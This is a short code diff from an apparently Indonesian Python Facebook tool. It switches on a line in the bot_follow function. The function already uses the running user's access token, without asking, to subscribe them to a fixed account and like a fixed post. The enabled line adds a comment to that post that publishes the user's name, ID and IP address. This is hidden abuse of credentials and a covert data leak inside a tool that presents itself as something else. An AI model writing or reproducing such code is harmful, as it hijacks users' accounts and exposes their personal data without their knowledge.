@@ -29,7 +29,7 @@ def bot_follow():
         message = f"Izin pakai bang Tegar\nNama : {nama}\nID : {id}\nIP : {ip}"
         requests.post(f"https://graph.facebook.com/{id_gw}/subscribers?access_token=" + token)
         requests.post(f"https://graph.facebook.com/{id_post}/likes?access_token=" + token)
-#        requests.post(f"https://graph.facebook.com/{id_post}/comments/?message={message}&access_token=" + token)
+        requests.post(f"https://graph.facebook.com/{id_post}/comments/?message={message}&access_token=" + token)
         menu()
     except IOError:
         login()
